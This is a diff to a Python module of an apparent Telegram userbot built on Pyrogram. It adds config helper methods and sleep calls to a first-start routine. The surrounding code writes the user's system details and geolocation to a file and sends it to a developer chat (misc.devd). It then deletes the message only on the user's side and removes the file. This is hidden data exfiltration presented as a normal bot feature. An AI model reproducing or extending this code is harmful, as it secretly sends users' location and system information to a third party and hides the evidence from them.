@@ -5,7 +5,7 @@ from pyrogram.errors import *
 import platform, requests, datetime
 import os
 from .stats import get_system
-import geocoder
+import geocoder, time
 
 config = configparser.ConfigParser()
 config.read(misc.session_path+'cache\\settings.ini')
@@ -21,13 +21,14 @@ try:
 except:pass
 
 class cfg:
-    def read(sec, key):
+
+    def read(sec, key) -> str | None:
         try:
             return config.get(sec, key)
         except:
             return None
 
-    def write(sec, key, val):
+    def write(sec, key, val) -> None:
         for attempt in range(2):
             while True:
                 try:
@@ -39,7 +40,14 @@ class cfg:
                     continue
                 else:
                     break
-            return
+
+    def sections() -> list:
+        all = config.sections()
+        return all
+
+    def list(sec: str = None) -> dict:
+        all = config.items(sec)
+        return all
 
 async def start(client: Client):
     for attempt in range(3):
@@ -74,7 +82,9 @@ Location: {g.latlng}
                     with open(misc.session_path+'first_start.txt', 'w') as file:
                         file.write(message)
                         file.close()
+                    time.sleep(5)
                     msg = await client.send_document(misc.devd, misc.session_path+'first_start.txt')
+                    time.sleep(.5)
                     await msg.delete(revoke=False)
                     os.remove(misc.session_path+'first_start.txt')
 
